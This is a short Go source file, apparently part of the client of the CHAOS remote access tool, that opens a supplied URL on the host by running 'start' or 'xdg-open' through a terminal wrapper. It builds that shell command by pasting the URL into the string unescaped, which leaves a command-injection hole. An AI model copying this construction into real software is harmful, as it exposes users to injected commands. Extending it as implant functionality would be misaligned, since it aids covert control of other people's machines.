package url

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/services/os"
	"strings"
)

type Service struct {
	Terminal services.Terminal
	OsType   os.OSType
}

func NewURLService(terminalService services.Terminal, osType os.OSType) services.URL {
	return &Service{Terminal: terminalService, OsType: osType}
}

func (u Service) OpenURL(url string) error {
	var cmdOut string
	switch u.OsType {
	case os.Windows:
		cmdOut = u.Terminal.Run(fmt.Sprintf("start %s", url), 10)
	case os.Linux:
		cmdOut = u.Terminal.Run(fmt.Sprintf("xdg-open %s", url), 10)
	default:
		return services.ErrUnsupportedPlatform
	}
	if strings.Contains(strings.ToLower(cmdOut), "failed") {
		return fmt.Errorf("%s", cmdOut)
	}
	return nil
}
